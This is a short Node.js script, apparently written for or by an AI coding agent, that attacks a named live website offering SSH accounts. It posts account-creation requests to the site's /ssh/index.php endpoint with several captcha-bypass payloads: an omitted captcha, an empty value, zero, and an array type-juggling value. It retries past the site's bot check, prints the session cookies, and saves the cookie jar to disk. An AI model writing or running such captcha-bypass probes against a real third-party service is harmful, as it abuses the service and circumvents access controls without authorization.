import { makeClient } from './lib.mjs';
import fs from 'fs';
const BASE = 'https://tutorialinjectid.my.id';
const c = makeClient(BASE);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const T = '/ssh/index.php';
const H = { 'content-type': 'application/x-www-form-urlencoded' };
const variants = [
  ['tanpa_captcha_kunci_session', 'action=create_ssh&server_id=1&server_name_display=pwn&password=pwn123'],
  ['captcha_kosong', 'action=create_ssh&server_id=1&server_name_display=pwn&captcha_code=&password=pwn123'],
  ['captcha_nol', 'action=create_ssh&server_id=1&server_name_display=pwn&captcha_code=0&password=pwn123'],
  ['captcha_array', 'action=create_ssh&server_id=1&server_name_display=pwn&captcha_code[]=1&password=pwn123'],
];
await c.get('/ssh/');
let first = true;
for (const [name, body] of variants) {
  let r = await c.get(T, { method: 'POST', body, headers: H });
  if (/wsidchk/.test(r.body)) r = await c.get(T, { method: 'POST', body, headers: H });
  console.log(name.padEnd(26), r.status, (r.body || '').replace(/\s+/g, ' ').slice(0, 220));
  if (first) { console.log('   (jar:', [...c.jar].map(([k, v]) => k + '=' + v.slice(0, 18)).join('; ') + ')'); first = false; }
  await sleep(1500);
}
fs.writeFileSync('/tmp/opencode/jar_ssh.json', JSON.stringify([...c.jar]));
